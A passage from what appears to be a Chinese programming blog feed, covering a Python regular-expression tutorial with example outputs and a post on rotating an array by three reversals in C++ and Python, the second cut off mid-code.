 <span class="token keyword">print</span><span class="token punctuation">(</span>pattern2 <span class="token keyword">in</span> string<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>True  False  </code></pre><h2 id="使用正则寻找匹配"><a href="#使用正则寻找匹配" class="headerlink" title="使用正则寻找匹配"></a>使用正则寻找匹配</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#regular experssion  </span>pattern1 <span class="token operator">=</span> <span class="token string">"cat"</span>  pattern2 <span class="token operator">=</span> <span class="token string">"dob"</span>  string <span class="token operator">=</span> <span class="token string">"dog runs to cat"</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern2<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(12, 15), match=&#39;cat&#39;&gt;  None  </code></pre><h2 id="匹配多种可能-使用"><a href="#匹配多种可能-使用" class="headerlink" title="匹配多种可能 使用[]"></a>匹配多种可能 使用[]</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># numtiple patterns ("run" or "ran")  </span>ptn <span class="token operator">=</span> r<span class="token string">"r[au]n"</span> <span class="token comment" spellcheck="true"># r 表示转义， []之中存放多种字符，匹配时只要存在一个便匹配到了  </span>string <span class="token operator">=</span> <span class="token string">"dog rans to cat"</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>ptn<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 7), match=&#39;ran&#39;&gt;  </code></pre><h2 id="匹配更多种可能"><a href="#匹配更多种可能" class="headerlink" title="匹配更多种可能"></a>匹配更多种可能</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># continue  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r[A-Z]n"</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r[a-z]n"</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r[0-9]n"</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r[0-9a-z]n"</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>None  &lt;re.Match object; span=(4, 7), match=&#39;ran&#39;&gt;  None  &lt;re.Match object; span=(4, 7), match=&#39;ran&#39;&gt;  </code></pre><h2 id="特殊类型匹配"><a href="#特殊类型匹配" class="headerlink" title="特殊类型匹配"></a>特殊类型匹配</h2><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># \d : decimal digit 所有数字  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\dn"</span><span class="token punctuation">,</span> <span class="token string">"run r4n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># \D : any non_decimal digit 不是数字的所有字符  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\Dn"</span><span class="token punctuation">,</span> <span class="token string">"run r4n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 7), match=&#39;r4n&#39;&gt;  &lt;re.Match object; span=(0, 3), match=&#39;run&#39;&gt;  </code></pre><h3 id="空白"><a href="#空白" class="headerlink" title="空白"></a>空白</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># \s : any white space [\t\n\r\f\v] 所有空白符，制表符，空格，回车等  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\sn"</span><span class="token punctuation">,</span> <span class="token string">'run r n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># \S : opposite to \s, any non_white space 所用可显示字符  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\Sn"</span><span class="token punctuation">,</span> <span class="token string">"run r n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 7), match=&#39;r n&#39;&gt;  &lt;re.Match object; span=(0, 3), match=&#39;run&#39;&gt;  </code></pre><h3 id="所有字母数字和下划线”-”"><a href="#所有字母数字和下划线”-”" class="headerlink" title="所有字母数字和下划线”_”"></a>所有字母数字和下划线”_”</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># \w : [a-zA-Z0-9_]  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\wn"</span><span class="token punctuation">,</span> <span class="token string">"r\nn r4n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># \W : opposite to \w 与\w 相反  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r\Wn"</span><span class="token punctuation">,</span> <span class="token string">"r\nn r_n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 7), match=&#39;r4n&#39;&gt;  &lt;re.Match object; span=(0, 3), match=&#39;r\nn&#39;&gt;  </code></pre><h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># \b :empty string (only at the start or end of the word) 在紧贴单词前后的空白  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"\bruns\b"</span><span class="token punctuation">,</span> <span class="token string">"dog runs to the cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># \B : empty string (but not at the start or end of a word) 紧贴单词前后没有空白  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"\Bruns\B"</span><span class="token punctuation">,</span> <span class="token string">"dogrunsto  the cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 8), match=&#39;runs&#39;&gt;  &lt;re.Match object; span=(3, 7), match=&#39;runs&#39;&gt;  </code></pre><h3 id="特殊字符-任意字符"><a href="#特殊字符-任意字符" class="headerlink" title="特殊字符 任意字符"></a>特殊字符 任意字符</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># \\ : match \  匹配反斜杠  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"runs\\"</span><span class="token punctuation">,</span> <span class="token string">"runs\ to me"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># . : metch anything (except \n) 除了换行符之外的所有字符  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"r.n"</span><span class="token punctuation">,</span> <span class="token string">"r[n to me"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(0, 5), match=&#39;runs\\&#39;&gt;  &lt;re.Match object; span=(0, 3), match=&#39;r[na]s&#39;&gt;  </code></pre><h3 id="句尾句首"><a href="#句尾句首" class="headerlink" title="句尾句首"></a>句尾句首</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># ^ : match line begining #匹配句首  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"^dog"</span><span class="token punctuation">,</span> <span class="token string">"dog runs to cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"^dog"</span><span class="token punctuation">,</span> <span class="token string">"cat runs to dog"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># $ : match line ending 匹配句尾  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"cat$"</span><span class="token punctuation">,</span> <span class="token string">"dog runs to cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"cat$"</span><span class="token punctuation">,</span> <span class="token string">"cat runs to dog"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(0, 3), match=&#39;dog&#39;&gt;  None  &lt;re.Match object; span=(12, 15), match=&#39;cat&#39;&gt;  None  </code></pre><h3 id="是否"><a href="#是否" class="headerlink" title="是否"></a>是否</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># ? : may or may not occur # 括号里的有就匹配，没有也匹配只要括号外的有  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"Mon(day)?"</span><span class="token punctuation">,</span> <span class="token string">"Monday"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"Mon(day)?"</span><span class="token punctuation">,</span> <span class="token string">"Mon"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(0, 6), match=&#39;Monday&#39;&gt;  &lt;re.Match object; span=(0, 3), match=&#39;Mon&#39;&gt;  </code></pre><h3 id="多行匹配"><a href="#多行匹配" class="headerlink" title="多行匹配"></a>多行匹配</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># multi-line  </span>string <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  dog runs to cat.  I run to dof.  '''</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"^I"</span><span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#多行直接匹配句首没法匹配  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"^I"</span><span class="token punctuation">,</span> string<span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>M<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#flags=r.M 表示让其把每行当成单独的来匹配  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>None  &lt;re.Match object; span=(18, 19), match=&#39;I&#39;&gt;  </code></pre><h3 id="0或多次"><a href="#0或多次" class="headerlink" title="0或多次"></a>0或多次</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># * ：occur 0 or more times  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab*"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab*"</span><span class="token punctuation">,</span> <span class="token string">"abbbb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(0, 1), match=&#39;a&#39;&gt;  &lt;re.Match object; span=(0, 5), match=&#39;abbbb&#39;&gt;  </code></pre><h3 id="一或多次"><a href="#一或多次" class="headerlink" title="一或多次"></a>一或多次</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># + ：occur 1 or more times  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab+"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab+"</span><span class="token punctuation">,</span> <span class="token string">"abbb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>None  &lt;re.Match object; span=(0, 4), match=&#39;abbb&#39;&gt;  </code></pre><h3 id="可选次数"><a href="#可选次数" class="headerlink" title="可选次数"></a>可选次数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># {n, m} : occur n to m times 出现了n到m之间的次数  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab{2,10}"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"ab{2,10}"</span><span class="token punctuation">,</span> <span class="token string">"abbbb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 注意{}之中不要添加空格了，只有数字  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>None  &lt;re.Match object; span=(0, 5), match=&#39;abbbb&#39;&gt;  </code></pre><h2 id="group-组"><a href="#group-组" class="headerlink" title="group 组"></a>group 组</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># group  </span>match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"(\d+), Data: (.+)"</span><span class="token punctuation">,</span> <span class="token string">"ID: 021523, Data: Feb/12/2017"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#()里的东西相当于是一个组  </span><span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#返回所用东西 7  </span><span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 29), match=&#39;021523, Data: Feb/12/2017&#39;&gt;  021523, Data: Feb/12/2017  021523  Feb/12/2017  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#自定义每一组的名字  </span>match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"(?P&lt;id>\d+), Data: (?P&lt;date>.+)"</span><span class="token punctuation">,</span> <span class="token string">"ID: 021523, Data: Feb/12/2017"</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 29), match=&#39;021523, Data: Feb/12/2017&#39;&gt;  021523  Feb/12/2017  </code></pre><h2 id="寻找所有匹配-findall"><a href="#寻找所有匹配-findall" class="headerlink" title="寻找所有匹配 findall"></a>寻找所有匹配 findall</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># findall  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"r[ua]n"</span><span class="token punctuation">,</span> <span class="token string">"run ran ren"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[&#39;run&#39;, &#39;ran&#39;]  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># | ： or  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"run|ran"</span><span class="token punctuation">,</span> <span class="token string">"run ran ren"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#仅匹配|两侧的，如果有括号进匹配括号内的|的两侧的东西  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[&#39;run&#39;, &#39;ran&#39;]  </code></pre><h2 id="替换-查找并替换"><a href="#替换-查找并替换" class="headerlink" title="替换(查找并替换)"></a>替换(查找并替换)</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># re.sub() replace  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>r<span class="token string">"r[au]ns"</span><span class="token punctuation">,</span> <span class="token string">"catches"</span><span class="token punctuation">,</span> <span class="token string">"dog runs to cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>dog catches to cat  </code></pre><h2 id="分裂-split"><a href="#分裂-split" class="headerlink" title="分裂 split"></a>分裂 split</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># re.split()  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>split<span class="token punctuation">(</span>r<span class="token string">"[,;\.]"</span><span class="token punctuation">,</span> <span class="token string">"a;b,c.d;e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#以【】中的为分隔符  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;]  </code></pre><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># compile  </span>compiled_re <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"r[ua]n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#相当于先将条件格式化  </span><span class="token keyword">print</span><span class="token punctuation">(</span>compiled_re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"dog ran to cat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>&lt;re.Match object; span=(4, 7), match=&#39;ran&#39;&gt;  </code></pre><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![Alt](<a href="https://morvanzhou.github.io/static/results/basic/13-10-01.png" target="_blank" rel="noopener">https://morvanzhou.github.io/static/results/basic/13-10-01.png</a> =150x300)<img src="https://vignette.wikia.nocookie.net/spongebob-dictionary/images/4/45/Spongebob_is_happy.jpg/revision/latest?cb=20171019221019" alt="Alt">  </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 字符匹配 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超长字符串的商</title>
      <link href="/2019/02/18/2019-you-qu-de-ti/"/>
      <url>/2019/02/18/2019-you-qu-de-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 例如{1， 2， 3， 4， 5， 6， 7，8}要向左平移2个单位  </p><ul><li>先将前两个数据{1，2}反转为{2，1}  </li><li>之后将后面的数据{3，4，5，6，7，8}反转为{8，7，6，5，4，3}  </li><li>两个片段的相对位置没有改变得到了{2，1，8，7，6，5，4，3}  </li><li>最后将总数据进行反转便得到了{3，4，5，6，7，8，1，2}  </li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p><strong>C++实现</strong>  </p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span>  </span>using namespace std<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Begin<span class="token punctuation">,</span> <span class="token keyword">int</span> End<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">int</span> N<span class="token punctuation">,</span>Move<span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      cin<span class="token operator">>></span>N<span class="token operator">>></span>Move<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//对Move进行处理  </span>    Move <span class="token operator">=</span> Move <span class="token operator">%</span> N<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//传进反转的开始和结束的下标   </span>    <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Move <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> Move<span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">Myreverse</span><span class="token punctuation">(</span>a <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          cout<span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">' '</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">Myreverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> Begin<span class="token punctuation">,</span> <span class="token keyword">int</span> End<span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> Begin<span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Begin <span class="token operator">+</span> End<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">int</span> m <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>python实现</strong>（复制后注意修改注释符号为‘#’哦）  </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 定义反转函数  </span> def <span class="token function">Myreverse</span><span class="token punctuation">(</span>Begin<span class="token punctuation">,</span> End<span class="token punctuation">)</span><span class="token punctuation">:</span>      global a      <span class="token keyword">for</span> i <span class="token keyword">in</span>  <span class="token function">range</span><span class="token punctuation">(</span>Begin<span class="token punctuation">,</span> <span class="token punctuation">(</span>Begin <span class="token operator">+</span> End<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//2 + 1):  </span>        m <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>          a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span>          a<span class="token punctuation">[</span>End <span class="token operator">-</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> Begin<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m  <span class="token comment" spellcheck="true">//输入数据          </span>term <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token function">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">"请输入长度和左移量："</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token function">int</span><span class="token 